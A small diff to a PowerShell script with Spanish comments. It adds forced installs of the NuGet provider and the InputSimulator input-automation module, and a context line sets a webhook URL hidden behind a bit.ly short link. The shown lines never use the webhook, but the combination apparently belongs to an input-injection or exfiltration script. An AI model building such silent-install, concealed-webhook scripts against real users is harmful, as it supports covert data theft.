@@ -1,10 +1,14 @@
-# Instala el módulo InputSimulator si no está instalado
-if (-not (Get-Module -Name "InputSimulator" -ListAvailable)) {
-    Install-Module -Name "InputSimulator" -Scope CurrentUser -Force
+# Instala el proveedor NuGet si no está instalado
+if (-not (Get-PackageProvider -Name NuGet -ErrorAction SilentlyContinue)) {
+    Write-Host "Instalando el proveedor NuGet..."
+    Install-PackageProvider -Name NuGet -Force
 }
 
-# Importa el módulo InputSimulator
-Import-Module -Name "InputSimulator"
+# Instala el módulo InputSimulator si no está instalado
+if (-not (Get-Module -Name "InputSimulator" -ListAvailable)) {
+    Write-Host "Instalando el módulo InputSimulator..."
+    Install-Module -Name "InputSimulator" -Scope CurrentUser -Force
+}
 
 # Define la URL del webhook
 $hookurl = "https://bit.ly/web_chupakbras"
